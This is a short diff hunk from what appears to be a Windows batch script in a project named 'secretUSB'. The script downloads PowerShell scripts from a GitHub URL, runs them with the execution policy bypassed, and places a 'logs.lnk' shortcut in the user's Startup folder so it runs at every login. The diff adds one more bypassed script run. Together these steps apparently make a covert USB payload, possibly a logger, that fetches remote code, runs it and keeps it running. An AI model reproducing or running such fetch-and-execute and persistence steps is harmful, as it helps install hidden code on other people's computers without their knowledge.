@@ -92,6 +92,7 @@ curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.ps1
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/raccourci.ps1
 
 powershell.exe -ExecutionPolicy Bypass -File raccourci.ps1
+powershell.exe -ExecutionPolicy Bypass -File dowload.ps1
 
 move C:\logs.lnk "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
